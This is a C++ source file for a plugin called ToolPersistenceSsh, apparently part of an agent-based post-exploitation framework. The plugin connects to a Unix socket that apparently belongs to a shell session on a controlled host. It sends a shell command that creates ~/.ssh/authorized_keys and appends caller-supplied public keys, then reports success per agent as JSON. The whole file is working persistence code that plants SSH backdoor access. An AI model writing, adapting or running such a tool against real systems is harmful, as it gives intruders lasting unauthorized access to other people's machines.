#include "tool-persistence-ssh.hpp"

#include <cerrno>
#include <cstdio>
#include <cstring>
#include <iostream>
#include <poll.h>
#include <sstream>
#include <string>
#include <vector>

#include <fcntl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

namespace {

struct PersistenceInput {
    std::string socketPath;
    std::string agentId;
    int timeoutMs = 2500;
    std::vector<std::string> publicKeys;
};

struct PersistenceResult {
    bool ok = false;
    std::string error;
    int appliedKeys = 0;
};

std::string trim(const std::string &value)
{
    const std::size_t first = value.find_first_not_of(" \t\r\n");
    if (first == std::string::npos)
        return "";
    const std::size_t last = value.find_last_not_of(" \t\r\n");
    return value.substr(first, last - first + 1);
}

std::string jsonEscape(const std::string &value)
{
    std::string out;
    out.reserve(value.size());
    for (unsigned char c : value) {
        switch (c) {
            case '\\': out += "\\\\"; break;
            case '"': out += "\\\""; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default:
                if (c < 0x20) {
                    char buf[7];
                    std::snprintf(buf, sizeof(buf), "\\u%04x", c);
                    out += buf;
                } else {
                    out += static_cast<char>(c);
                }
        }
    }
    return out;
}

std::string shellSingleQuote(const std::string &value)
{
    std::string out;
    out.reserve(value.size() + 8);
    out.push_back('\'');
    for (char c : value) {
        if (c == '\'') {
            out += "'\"'\"'";
        } else {
            out.push_back(c);
        }
    }
    out.push_back('\'');
    return out;
}

bool isSafePublicKeyText(const std::string &value)
{
    if (value.empty() || value.size() > 8192)
        return false;
    for (unsigned char c : value) {
        if (c == '\n' || c == '\r' || c == '\0')
            return false;
    }
    return true;
}

bool pollReady(int fd, short events, int timeoutMs, std::string &error)
{
    pollfd pfd{};
    pfd.fd = fd;
    pfd.events = events;

    int rc = 0;
    do {
        rc = ::poll(&pfd, 1, timeoutMs);
    } while (rc == -1 && errno == EINTR);

    if (rc == 0) {
        error = "timeout";
        return false;
    }
    if (rc < 0) {
        error = "poll_failed";
        return false;
    }
    if (pfd.revents & events)
        return true;

    error = "poll_failed";
    return false;
}

bool parseInputLine(const std::string &line, PersistenceInput &out, std::string &error)
{
    out.socketPath = trim(line);
    if (out.socketPath.empty()) {
        error = "invalid_input";
        return false;
    }
    return true;
}

std::string buildPersistenceCommand(const std::vector<std::string> &publicKeys,
                                    const std::string &doneToken)
{
    std::string command =
        "mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys; ";

    for (const auto &publicKey : publicKeys) {
        const std::string escaped = shellSingleQuote(publicKey);
        command += "if ! grep -Fqx -- " + escaped + " ~/.ssh/authorized_keys; then echo " + escaped + " >> ~/.ssh/authorized_keys; fi; ";
    }

    command += "echo " + doneToken + "\\n";
    return command;
}

PersistenceResult applyPersistence(const PersistenceInput &input)
{
    PersistenceResult result;

    if (input.publicKeys.empty()) {
        result.error = "no_public_keys";
        return result;
    }

    sockaddr_un addr{};
    if (input.socketPath.size() >= sizeof(addr.sun_path)) {
        result.error = "socket_path_too_long";
        return result;
    }

    int fd = ::socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd == -1) {
        result.error = "socket_create_failed";
        return result;
    }

    int flags = ::fcntl(fd, F_GETFL, 0);
    if (flags == -1 || ::fcntl(fd, F_SETFL, flags | O_NONBLOCK) == -1) {
        ::close(fd);
        result.error = "socket_flags_failed";
        return result;
    }

    addr.sun_family = AF_UNIX;
    std::snprintf(addr.sun_path, sizeof(addr.sun_path), "%s", input.socketPath.c_str());

    int rc = ::connect(fd, reinterpret_cast<sockaddr*>(&addr), sizeof(addr));
    if (rc == -1 && errno != EINPROGRESS) {
        ::close(fd);
        result.error = "connect_failed";
        return result;
    }

    if (rc == -1) {
        std::string pollError;
        if (!pollReady(fd, POLLOUT, input.timeoutMs, pollError)) {
            ::close(fd);
            result.error = pollError == "timeout" ? "timeout" : "connect_failed";
            return result;
        }
        int soError = 0;
        socklen_t soLen = sizeof(soError);
        if (::getsockopt(fd, SOL_SOCKET, SO_ERROR, &soError, &soLen) == -1 || soError != 0) {
            ::close(fd);
            result.error = "connect_failed";
            return result;
        }
    }

    if (::fcntl(fd, F_SETFL, flags) == -1) {
        ::close(fd);
        result.error = "socket_flags_failed";
        return result;
    }

    const std::string doneToken = "__AB_PERSIST_DONE__";
    const std::string command = buildPersistenceCommand(input.publicKeys, doneToken);

    std::size_t total = 0;
    while (total < command.size()) {
        const ssize_t sent = ::send(fd, command.data() + total, command.size() - total,
#ifdef MSG_NOSIGNAL
            MSG_NOSIGNAL
#else
            0
#endif
        );
        if (sent < 0) {
            if (errno == EINTR)
                continue;
            ::close(fd);
            result.error = "send_failed";
            return result;
        }
        total += static_cast<std::size_t>(sent);
    }

    std::string response;
    response.reserve(1024);
    char chunk[256];

    while (true) {
        std::string pollError;
        if (!pollReady(fd, POLLIN, input.timeoutMs, pollError)) {
            ::close(fd);
            result.error = pollError == "timeout" ? "timeout" : "recv_failed";
            return result;
        }

        const ssize_t received = ::recv(fd, chunk, sizeof(chunk), 0);
        if (received < 0) {
            if (errno == EINTR)
                continue;
            ::close(fd);
            result.error = "recv_failed";
            return result;
        }
        if (received == 0) {
            ::close(fd);
            result.error = "connection_closed";
            return result;
        }

        response.append(chunk, static_cast<std::size_t>(received));
        if (response.find(doneToken) != std::string::npos) {
            result.ok = true;
            result.appliedKeys = static_cast<int>(input.publicKeys.size());
            ::close(fd);
            return result;
        }
        if (response.size() > 32768) {
            ::close(fd);
            result.error = "invalid_response";
            return result;
        }
    }
}

std::string buildOutput(const PersistenceInput &input, const PersistenceResult &result)
{
    std::ostringstream out;
    out << "{"
        << "\"type\":\"persistence\"," 
        << "\"agent_id\":\"" << jsonEscape(input.agentId) << "\"," 
        << "\"ok\":" << (result.ok ? "true" : "false") << "," 
        << "\"applied_keys\":" << (result.ok ? std::to_string(result.appliedKeys) : "null") << "," 
        << "\"error\":";
    if (result.ok)
        out << "null";
    else
        out << "\"" << jsonEscape(result.error.empty() ? "unknown_error" : result.error) << "\"";
    out << "}";
    return out.str();
}

} // namespace

void PluginSystem::ToolPersistenceSsh::toggle()
{
    isActive = !isActive;
}

void PluginSystem::ToolPersistenceSsh::execute(const nlohmann::json &params)
{
    PersistenceInput input;
    input.agentId = params.value("agent_id", std::string("shell"));
    input.timeoutMs = params.value("timeout_ms", input.timeoutMs);
    if (input.timeoutMs <= 0)
        input.timeoutMs = 2500;

    if (params.contains("public_keys") && params["public_keys"].is_array()) {
        for (const auto &entry : params["public_keys"]) {
            if (!entry.is_string())
                continue;
            const std::string key = trim(entry.get<std::string>());
            if (isSafePublicKeyText(key)) {
                input.publicKeys.push_back(key);
            }
        }
    }

    if (!isActive) {
        PersistenceResult disabled;
        disabled.ok = false;
        disabled.error = "disabled";
        std::cout << buildOutput(input, disabled) << std::endl;
        return;
    }

    std::string inputLine;
    if (!std::getline(std::cin, inputLine))
        inputLine.clear();

    std::string parseError;
    if (!parseInputLine(inputLine, input, parseError)) {
        PersistenceResult failed;
        failed.error = parseError.empty() ? "invalid_input" : parseError;
        std::cout << buildOutput(input, failed) << std::endl;
        return;
    }

    PersistenceResult result = applyPersistence(input);
    std::cout << buildOutput(input, result) << std::endl;
}

extern "C" PluginSystem::ATool *instance(void)
{
    return new PluginSystem::ToolPersistenceSsh();
}
